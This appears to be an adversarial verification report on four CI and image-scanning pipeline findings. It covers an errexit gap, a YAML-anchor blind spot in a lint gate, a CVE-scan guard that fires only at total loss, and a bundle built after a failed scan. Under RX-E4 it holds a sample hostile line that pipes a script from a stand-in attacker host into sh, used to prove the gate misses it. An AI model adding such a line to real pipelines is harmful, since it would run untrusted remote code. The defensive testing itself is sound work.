# Verify — dimension E, the four mediums

Adversarial verification of `RX-E3`–`RX-E6` from `finders/E-build-pipeline.md`. Default verdict
REFUTED; each finding below earned its verdict by reproduction. Everything ran in `cp -a` copies of
a detached worktree at `672a500`. No tracked file was modified, `--write-baseline` was not run,
`just image` / `just scan` were not run against the real registry, and the rig was not touched.

| | |
|---|---|
| `RX-E3` | **CONFIRMED**, severity **low** (finder said medium) |
| `RX-E4` | **CONFIRMED**, severity **medium** |
| `RX-E5` | **CONFIRMED**, severity **medium** |
| `RX-E6` | **CONFIRMED**, severity **medium** |

Every `file:line` below was re-read at `672a500`.

---

## RX-E3 — `image_tag` still returns an empty version at status 0

**CONFIRMED as stated. Severity downgraded medium → low: no wrong artifact can ship.**

### Citations re-verified

`scripts/lib.sh:88-93` is the comment ("when that substitution is an *argument* rather than an
assignment the enclosing command still succeeds"). `scripts/lib.sh:94-102` is `image_tag`, whose
`:100` is the assignment RW-G5 installed. The three call sites are `scripts/image-build.sh:23`,
`scripts/image-scan.sh:70`, `scripts/test-image.sh:14`; `grep -rn image_tag scripts/ justfile
.github/ .gitlab-ci.yml` finds no others. All three spell it `x="$(image_tag)"`.

### Reproduction

`ARG VCOWS_VERSION=0.1.0.0` deleted from `Containerfile:89` in a copy. Three shapes, one shell:

```
=== A: image_tag called directly (not in a substitution) ===
error: no 'ARG VCOWS_VERSION=' in Containerfile
rc=1

=== B: the real call shape, tag="$(image_tag)" ===
error: no 'ARG VCOWS_VERSION=' in Containerfile
tag=[localhost/vcows-deploy:] CONTINUED
rc=0

=== C: the pre-RW-G5 inline form, same call shape ===
error: no 'ARG VCOWS_VERSION=' in Containerfile
tag=[localhost/vcows-deploy:] CONTINUED
rc=0
```

B and C are byte-identical in behaviour. **The RW-G5 remedy changes nothing at any real call
site**, which is exactly what the finding claims. A is the interesting control the finder did not
show: the assignment form *does* stop errexit-correctly when `image_tag` is called as a plain
command. So the comment at `:88-93` is not merely mis-worded — the mechanism it names is real in
isolation and irrelevant in practice, because every caller wraps the function in `$(...)`, where
`inherit_errexit` being off (RX-E2, `lib.sh:16`) turns errexit back off one level down. The
docstring records a false cause as measured fact, and the issue is closed.

### Reachability and consequence — why this is low, not medium

I checked the downstream question the finder did not: **is the empty tag caught before anything is
pushed or bundled?** It is, at all three consumers, loudly:

```
$ podman build -t "localhost/vcows-tagtest:" .
Error: tag localhost/vcows-tagtest:: invalid reference format        (rc 125)

$ podman save --format docker-archive -o … "localhost/vcows-deploy:"
Error: parsing reference "localhost/vcows-deploy:": invalid reference format   (rc 125)
```

`image-build.sh:41` and `image-scan.sh:77` both die on that, and `test-image.sh:14` exports the
empty tag into a pytest gate that cannot find the image. `die`'s own `error: no 'ARG
VCOWS_VERSION=' in Containerfile` is on stderr immediately above the podman line in every case, so
the correct diagnosis is *in the output*; it is followed by a second, worse message rather than
being suppressed. Nothing is tagged, saved, pushed or bundled with an empty version. There is no
path here to the plausible-looking-wrong artifact this repo cares about — only a noisy stop with a
confusing second line.

The trigger is also narrow: the `ARG VCOWS_VERSION=` line has to stop matching
`^ARG VCOWS_VERSION=` (deleted, renamed, or reformatted with spaces around the `=`).

**Low.** The behaviour is real, the fix did not fix it, and the file now argues against reopening —
that last part is the substance. It should be filed as the wrong-comment half of RX-E2 rather than
as an independent defect: RX-E2's one line fixes the behaviour and `:88-93` then needs rewriting to
name `inherit_errexit`.

---

## RX-E4 — `workflows_carry_no_logic` is blind to YAML-anchor command lists

**CONFIRMED. Severity medium holds.**

### Citations re-verified

`scripts/lint.sh:61-76` is `commands()`; the defect is the list branch at `:68-71`, which iterates
a `script:` list and yields only `isinstance(item, str)` items — a nested list item is dropped with
no recursion and no diagnostic. `.gitlab-ci.yml:36-39` is `.bootstrap: &bootstrap` and its three
commands. `*bootstrap` is spliced at `:49`, `:74`, `:122`, `:153` — all four jobs.

The anchor's *definition* is invisible for a second reason: `.bootstrap` is not a
`run`/`script`/`before_script`/`after_script` key, so `commands()` recurses into its value, hits a
list of `str`, and calls `commands(str)` on each, which matches neither branch and yields nothing.

### Reproduction

The parsed shape, from the committed file:

```
check job script node: [['./scripts/os-deps.sh', './scripts/install-tools.sh', 'just dev-env'], 'just check']
```

The gate's own extractor over the committed `.gitlab-ci.yml` yields **13** commands —
`just bundle/check/ensure-mirror/image/mirror/scan/test-image/test-tofu/verify-provider` — and none
of the three bootstrap lines. The finder's count is exact.

Hostile line added to `.bootstrap` in a copy, nothing else changed:

```yaml
.bootstrap: &bootstrap
  - ./scripts/os-deps.sh
  - ./scripts/install-tools.sh
  - just dev-env
  - curl -s https://evil.example/x.sh | sh
```

The gate alone: `GATE EXIT=0`. And the whole recipe, verbatim:

```
$ just lint
./scripts/lint.sh
lint
All checks passed!
  ok    ruff check
49 files already formatted
  ok    ruff format
  ok    hadolint
  ok    tofu fmt
  ok    shellcheck
  ok    workflows carry no logic
all gates pass
JUST LINT EXIT=0
```

Control — the same command as a direct string in `check:`'s `script:` rather than through the
anchor:

```
        .gitlab-ci.yml: curl -s https://evil.example/x.sh | sh
GATE EXIT=1
```

So the gate works, and stops working at exactly the YAML shape all four GitLab jobs use.

### Reachability and consequence

The gate is the enforcement behind `CLAUDE.md`'s "CI calls `just` recipes and nothing else",
`justfile:3-6` ("scripts/lint.sh asserts that rather than trusting it") and `.gitlab-ci.yml:6-8`.
RW-G4 was closed on it. The blind spot is not an obscure corner: `.bootstrap` is *the* place a
person adds a pre-`just` step, and the gate's own comment at `lint.sh:31-33` says it was written
parsed-not-grepped precisely because "a GitLab job puts its commands in a list *under* `script:`".
It reads that list and drops the nested one.

Nothing ships wrong today — the three bootstrap lines are on the allowlist, and GitHub Actions has
no YAML anchors, so `.github/` is fully covered. This is a latent gate hole, not a live defect,
which is what keeps it below high. It stays at medium rather than low for this repo's own stated
reason: the migration plan is to delete `.github/` and keep `.gitlab-ci.yml`, at which point the
only pipeline file is the one whose bootstrap is unchecked, and `CLAUDE.md`'s gate-discipline
section makes "a gate that quietly passes because it did not run" a first-class defect. `yield
from commands(item)` in the list branch is two lines and adds no surface.

---

## RX-E5 — the "scan did not read this image" guard only fires at 100% loss

**CONFIRMED. Severity medium holds.**

### Citations re-verified

`scripts/image-scan.sh:134`: `if [ "$accepted" -gt 0 ] && [ "$missing" -eq "$accepted" ]; then`.
The comment reasoning in proportions is `:126-130` — "One or two accepted ids disappearing is
ordinary … *All* of them disappearing at once is not a clean image; it is a scan that did not read
this image". Equality, not proportion. Nothing between two and a hundred.

### Reproduction

Fake `podman`/`trivy`/`syft` placed in `.tools/bin` (which `lib.sh:26` prepends to PATH, so the
fakes win over the real ones), the real 100-id `docs/cve-baseline.json` untouched, and a report
carrying 3 `Results` and exactly one accepted id (`CVE-2026-11822`) plus an SBOM of 456 packages —
both structural floors satisfied:

```
saving localhost/vcows-deploy:0.1.0.0
scanning
baseline entries no longer found (99 of 100; stale, or fixed by a pin bump):
  CVE-2026-11824
  … 97 more …
  GO-2026-5932
no findings outside the baseline
SCAN EXIT=0
```

**99 of 100 accepted findings vanished and the gate is green.** The same harness with the last id
removed:

```
error: none of the 100 accepted findings are present -- the scan did not read this image
SCAN EXIT=1
```

The guard is correct at 100 and silent at 99. RW-G2's structural floors (`scan_floor`,
`image-scan.sh:56-64`) are unaffected and still fire.

### Reachability and consequence

The realistic trigger is not a swapped image; it is a scanner that loses an analyser. The 100
accepted ids split roughly 55 rocky-base / 45 Go-binary. A trivy release that stops walking Go
binaries inside the archive, or a `--input` archive whose Go layers did not extract, drops ~45 at
once — nowhere near the equality — and the gate passes green while the delivery bundle ships a
`trivy.json` that reports the image as materially cleaner than it is. That is this repo's
S1-shaped class: it looks like success, and the artifact that ships is plausible rather than
visibly broken.

Mitigating: the 99-line `gone:` list is printed to stderr, so a human at a terminal sees a wall of
CVE ids. In CI it is a green job with the wall buried in a log nobody opens, and `just bundle`
follows in the same job (`.github/workflows/image.yml:79-80`, `.gitlab-ci.yml:122-127`,
`:153-158`). Medium, not high, because it needs a scanner regression to trigger and the failure is
loud-in-the-log even when it is green-in-the-exit-code. The fix the finder proposes
(`missing * 2 -gt accepted`, or any proportion) is one line and implements the comment that is
already there.

---

## RX-E6 — `just bundle` ships the `.cache/` a failed `just scan` left behind

**CONFIRMED, end to end. Severity medium holds.**

### Citations re-verified

`scripts/bundle.sh:50-52` is the whole precondition — a `[ -f "$f" ]` loop over `image.tar`,
`sbom.spdx.json`, `trivy.json`. There is no scan-status input of any kind. `image-scan.sh` writes
the archive at `:77` and the report and SBOM at `:80-81`; the baseline is not consulted until
`:113`, and the `die` for a new finding is `:123`. Everything the bundle needs is on disk and
current before the gate can reject anything.

### Reproduction

Fresh copy at `672a500` with `.cache/` removed. Fakes in `.tools/bin`: `podman save` writes the
real 444 MB Phase 0 `image.tar` (a genuine docker-archive, so `archive_label` at `bundle.sh:32-39`
reads real labels), `syft` writes the real Phase 0 SBOM, and `trivy` writes the real Phase 0 report
with one finding injected. Then the two commands `README.md:261-264` documents, in order:

```
$ scripts/image-scan.sh
saving localhost/vcows-deploy:0.1.0.0
scanning
findings not in docs/cve-baseline.json:
  CVE-2099-99999
error: 1 new finding(s)
SCAN EXIT=1

$ ls .cache/scan
image.tar  sbom.spdx.json  trivy.json          # complete and current

$ scripts/bundle.sh
compressing image.tar -> vcows-deploy-0.1.0.0-672a500a5f3db394e91a3b91fb383517e504246d.tar.gz
bundle  …/.cache/delivery
  vcows-deploy-0.1.0.0-672a500a5f3db394e91a3b91fb383517e504246d.tar.gz  (144M)
  sbom.spdx.json, trivy.json, image.tar.sha256, SHA256SUMS
BUNDLE EXIT=0
```

What landed in `.cache/delivery`, and what is inside it:

```
$ ls .cache/delivery
SHA256SUMS  image.tar.sha256  sbom.spdx.json  trivy.json
vcows-deploy-0.1.0.0-672a500a5f3db394e91a3b91fb383517e504246d.tar.gz

$ jq -c '…' .cache/delivery/trivy.json
["CVE-2026-11822","CVE-2099-99999"]

$ sha256sum -c SHA256SUMS
vcows-deploy-0.1.0.0-672a500….tar.gz: OK
sbom.spdx.json: OK
trivy.json: OK
image.tar.sha256: OK
```

A complete, correctly named, internally consistent, checksum-verifying delivery bundle for an image
the CVE gate rejected sixty seconds earlier — with the rejected finding sitting inside the shipped
report. No warning fired: the worktree-mismatch warning at `bundle.sh:62-65` stayed quiet because
the archive's revision matched HEAD, which is exactly the "everything looks right" case.

### Reachability and consequence

CI is safe, and I verified why rather than taking it on trust: `.github/workflows/image.yml:79-80`
and `.gitlab-ci.yml:122-127` / `:153-158` run `just scan` and `just bundle` as consecutive steps, so
a non-zero scan ends the job before `bundle` runs, and the GitHub `upload-artifact` step
(`image.yml:89-93`) carries no `if: always()`. The exposure is the hand-run path, and that path is
the *documented* one: `README.md:261-264` is a three-line code block of `just image` / `just scan` /
`just bundle`, and `README.md:267` says "`just bundle` is what produces the artifact that goes on
the medium".

This is the second class the brief distinguishes, not the first: the bundle is not visibly broken,
it is plausible and wrong. Its filename claims the right version and the right 40-hex clean
revision, its `SHA256SUMS` verifies, and the only record of the rejection is a finding id inside a
2.3 MB `trivy.json` that nothing at the receiving site reads. `bundle.sh` has no way to tell a
`.cache/scan` a passing scan wrote from one a failing scan wrote, because they are byte-identical
apart from the report.

It requires an operator to proceed past a loud red `error: 1 new finding(s)`, which is what holds
it at medium rather than high. But the two commands are adjacent lines in a documented procedure,
a bundle can be assembled hours later in a different terminal from a `.cache/` nobody remembers the
provenance of, and the artifact carries no evidence either way. The finder's fix — a
`.cache/scan/PASSED` stamp written on success, cleared where `image-scan.sh:34` already clears the
archive, and required by `bundle.sh:50-52` — is about four lines across the two files and adds one
file to a directory that is already the interface between them.

---

## Method notes

* Worktree: `…/scratchpad/rv3`, detached at `672a500`, `git status --porcelain` clean. The main
  checkout's uncommitted shellcheck changes were not used.
* Each reproduction ran in its own `mktemp -d` `cp -a` copy. Fakes were installed into the copy's
  `.tools/bin`, which `lib.sh:26` prepends to `PATH`, so they shadow the real `trivy`/`syft` without
  any PATH manipulation the scripts would not themselves perform.
* `just image` and `just scan` were not run against the real registry; RX-E5 and RX-E6 used
  synthetic reports and, for RX-E6, the real Phase 0 archive and SBOM so the bundle path exercised
  genuine docker-archive label reads.
* `--write-baseline` was not run. `docs/cve-baseline.json` was read only.
